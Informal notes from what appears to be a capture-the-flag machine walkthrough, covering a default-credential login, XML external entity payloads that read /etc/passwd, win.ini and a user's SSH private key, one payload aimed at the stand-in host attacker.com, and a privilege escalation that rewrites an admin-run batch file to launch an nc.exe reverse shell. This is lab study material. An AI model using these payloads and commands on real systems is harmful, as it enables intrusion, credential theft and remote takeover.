initial scans show ports 22, 80, 443 en
port 80 had a login page. random admin:password login worked
The page /order sends an xml request to a the web server to get the orders submitted
But the xml version being used is xml 1.0
This is vulnerable to XXE/XEE or xml external entity injection
*If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application*
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```

That means, whatever you put in "toreplace" in the Doctype, you gotta put as &toreplace; in one of the ID names that get returned to you in the response.

---
we start with the windows.ini file
`<!DOCTYPE root [ <!ENTITY ext SYSTEM "file:///c:/windows/win.ini" > ]>`
and `<item>&ext;</item>`
we get it.
Next, we go for the id_rsa.
Since we found the user Daniel on the webpage source code, it should be in c:\users\daniel\.ssh\id_rsa
copy that, and make sure to `chomd 744 id_rsa`
`ssh daniel@IP -i id_rsa`
user flag.

---
In the Log-Management Directory, there is ajob.bat, which calls out to some wewtutil.exe. The important part is, it is run periodiaclly by admin, and we have complete control over the file. To verify,
powershell, ps | findstr wevtutil
icacls job.bat
So we transfer a nc.exe over, paste it in Log-Management
then `echo C:\Log-Management\nc.exe -c cmd.exe IP PORT > job.bat`
Without double quotes.
keep doing the echo part, cuz the file gets overwritten as well
Anyways, ROOT!
